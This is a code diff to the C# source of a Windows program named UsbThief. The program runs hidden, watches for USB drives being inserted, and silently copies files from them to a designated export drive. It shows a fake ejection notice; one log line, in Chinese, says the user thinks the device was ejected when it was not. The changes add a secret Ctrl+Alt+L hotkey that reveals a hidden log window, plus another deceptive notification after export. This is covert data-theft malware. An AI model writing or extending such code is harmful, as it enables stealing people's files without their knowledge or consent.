@@ -13,6 +13,8 @@ using Microsoft.Win32;
 using Microsoft.Win32.TaskScheduler;
 using Newtonsoft.Json;
 using NLog;
+using NHotkey;
+using NHotkey.WindowsForms;
 
 namespace UsbThief
 {
@@ -29,7 +31,8 @@ namespace UsbThief
         public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //请求删除一个设备或媒体片已被取消。
         public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //一个设备或媒体片已被删除。
         public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //一个设备或媒体一块即将被删除。不能否认的。
-        public Logger logger = LogManager.GetCurrentClassLogger();
+        public LogForm form = new LogForm();
+        public static Logger logger = null;
         public SynchronizationContext mainThreadSynContext;
         public Status sta = Status.none;
         public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, volName = "仿生人会涮电子羊吗" };
@@ -67,12 +70,22 @@ namespace UsbThief
                 Environment.Exit(0);
             }
             InitializeComponent();
+            form.Show();
+            form.Hide();
             logger.Info("UsbThief已启动");
             logger.Info("innerVer：" + innerVer);
             mainThreadSynContext = SynchronizationContext.Current;
             notifyIcon1.MouseUp += NotifyIcon1_MouseUp;
             notifyIcon1.ContextMenuStrip.Items[0].Click += Item0_Click;
             notifyIcon1.ContextMenuStrip.Items[2].Click += Item2_Click;
+            try
+            {
+                HotkeyManager.Current.AddOrReplace("ShowLogForm", Keys.Control | Keys.Alt | Keys.L, ShowLogForm);
+            }
+            catch (Exception e)
+            {
+                logger.Info("注册热键失败：\n" + e);
+            }
             try
             {
                 if (!Directory.Exists(workspace))
@@ -189,9 +202,9 @@ namespace UsbThief
         #region 窗口加载
         private void Form1_Load(object sender, EventArgs e)
         {
-            logger.Info("窗体已加载");
+            logger.Info("窗口已加载");
             SetVisibleCore(false);
-            logger.Info("窗体已隐藏");
+            logger.Info("窗口已隐藏");
         }
         protected override void SetVisibleCore(bool value)
         {
@@ -219,6 +232,14 @@ namespace UsbThief
             Thread.Sleep(5000);
             notifyIcon1.Visible = false;
             logger.Info("用户以为他弹出了设备，其实并没有~");
+        }
+        #endregion
+        #region 显示日志窗口
+        private void ShowLogForm(object sender, HotkeyEventArgs e)
+        {
+            form.Show();
+            form.WindowState = FormWindowState.Normal;
+            logger.Info("已显示日志窗口");
         }
         #endregion
         #region 监听Usb插入消息
@@ -275,7 +296,6 @@ namespace UsbThief
                                             logger.Info("目标Usb设备“" + drive.VolumeLabel + "”已插入，不会对其进行复制操作");
                                             try
                                             {
-                                                //List<string> devices = new List<string>();
                                                 //第二个bool指的是是否强制导出，如果之前导出过程中设备拔出导致状态停留在exporting，那么就强制导出
                                                 Dictionary<string, bool> devices = new Dictionary<string, bool>();
                                                 StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
@@ -332,13 +352,14 @@ namespace UsbThief
                                                             }
                                                             catch (Exception e)
                                                             {
-
                                                                 logger.Error("文件导出失败：\n" + e);
                                                             }
                                                         }
                                                     }
                                                 }
-
+                                                notifyIcon1.ShowBalloonTip(5000);
+                                                Thread.Sleep(5000);
+                                                notifyIcon1.Visible = false;
                                             }
                                             catch (Exception e)
                                             {
